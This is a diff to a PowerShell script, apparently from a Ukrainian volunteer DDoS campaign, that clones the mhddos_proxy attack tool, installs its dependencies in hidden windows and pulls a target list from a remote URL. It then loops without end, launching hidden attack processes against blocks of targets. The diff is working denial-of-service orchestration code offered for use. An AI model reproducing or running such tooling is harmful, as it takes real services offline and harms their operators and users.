@@ -7,8 +7,13 @@ $GitExe = $GitPath + "git.exe";
 $PythonPath = $PSScriptRoot + "\\Python\\";
 $PythonExe = $PythonPath + "python.exe";
 $MhddosPath = $PSScriptRoot + "\\Mhddos_proxy\\";
+
 $mhddos_proxy_URL = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git';
 $TargetsURI = 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets';
+
+$LiteBlockSize = 50;
+$BlockSize = $LiteBlockSize * 4;
+$BlockJobTime = 60;
 
 $ErrorActionPreference = "SilentlyContinue";
 $ProgressPreference = "SilentlyContinue";
@@ -24,6 +29,9 @@ else {
 
 $host.UI.RawUI.BackgroundColor = [ConsoleColor]::Black
 $host.UI.RawUI.ForegroundColor = [ConsoleColor]::Green
+Clear-Host;
+$Banner = Get-Banner;
+Write-Host $Banner;
 $StartupMessage = "Бігунець версії $RunnerVersion"
 if ($RunningLite) {
     $StartupMessage = $StartupMessage + " Lite"
@@ -62,6 +70,46 @@ $PyArgs = "-m pip install --upgrade pip";
 Start-Process -FilePath $PythonExe -ArgumentList $PyArgs -Wait -WindowStyle Hidden;
 $PyArgs = "-m pip install -r requirements.txt";
 Start-Process -FilePath $PythonExe -ArgumentList $PyArgs -Wait -WindowStyle Hidden;
-Clear-Line "Отримуємо список цілей...";
-$TargetList = Get-Content $TargetsURI $RunningLite;
 
+Clear-Line "Отримуємо список цілей...";
+$TargetList = Get-Targets $TargetsURI $RunningLite;
+$StopRequested = $false;
+$NewTask = $true;
+[System.Collections.ArrayList]$IDList = @();
+
+while (-not $StopRequested) {
+    if ($NewTask -and (-not $RunningLite)) {
+        $Targets = $TargetList | Spit-Array -size $BlockSize;
+        foreach ($Target in $Targets) {
+            if ($Target.Count -gt 0) {
+                $TargetString = $Target -join ' ';
+                $RunnerArgs = $('runner.py ' + $TargetString);
+                $PyProcess = Start-Process -FilePath $PythonExe -ArgumentList $RunnerArgs -WindowStyle Hidden;
+                $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
+                $IDList += $PyProcess.Id;
+            }
+        }
+    }
+    if ($NewTask -and $RunningLite) {
+        $Targets = $TargetList | Spit-Array -size $LiteBlockSize;
+        foreach ($Target in $Targets) {
+            if ($Target.Count -gt 0) {
+                $TargetString = $Target -join ' ';
+                $Runner_args = $('runner.py ' + $TargetString);
+                $PyProcess = Start-Process -FilePath $PythonExe -WorkingDirectory $WorkDir -ArgumentList $Runner_args -WindowStyle Hidden -PassThru;
+                # We REALLY do not want our system to hang.
+                $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
+                $StartedBlockJob = [System.DateTime]::Now;
+                $StopBlockJob = $StartedBlockJob.AddMinutes($BlockJobTime);
+                while (($PyProcess.HasExited -eq $false) -and ($StopBlockJob -gt [System.DateTime]::Now)) {
+                    $BlockJobLeft = [int] $($StopBlockJob - [System.DateTime]::Now).TotalMinutes;
+                    Clear-Line "$BlockJobLeft хвилин братерства на $($Target.Count) цілей";
+                    Start-Sleep -Seconds 5;
+                }
+                Stop-Tree $PyProcess.Id;
+                Clear-Line "Відпрацювали $($Target.Count) цілей. Беремо наступний блок";
+            }
+        }
+        $NewTask = $true;
+    }
+}
